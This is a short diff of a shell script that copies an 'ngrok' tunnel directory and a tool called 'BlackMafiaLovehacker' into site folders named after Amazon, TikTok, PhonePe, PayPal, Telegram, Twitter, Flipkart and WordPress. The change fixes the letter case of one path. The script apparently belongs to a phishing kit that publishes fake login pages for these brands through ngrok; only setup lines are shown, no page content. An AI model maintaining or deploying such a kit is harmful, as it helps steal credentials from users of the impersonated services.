@@ -50,7 +50,7 @@ cp -R ngrok BlackMafiaLovehacker Sites/amazonsign/
 cp -R ngrok BlackMafiaLovehacker Sites/tiktok/
 cp -R ngrok BlackMafiaLovehacker Sites/phonepay/
 cp -R ngrok BlackMafiaLovehacker Sites/paypal/
-cp -R ngrok BlackMafiaLovehacker sites/telegram/
+cp -R ngrok BlackMafiaLovehacker Sites/telegram/
 cp -R ngrok BlackMafiaLovehacker Sites/twitter/
 cp -R ngrok BlackMafiaLovehacker Sites/flipcart/
 cp -R ngrok BlackMafiaLovehacker Sites/wordpress/
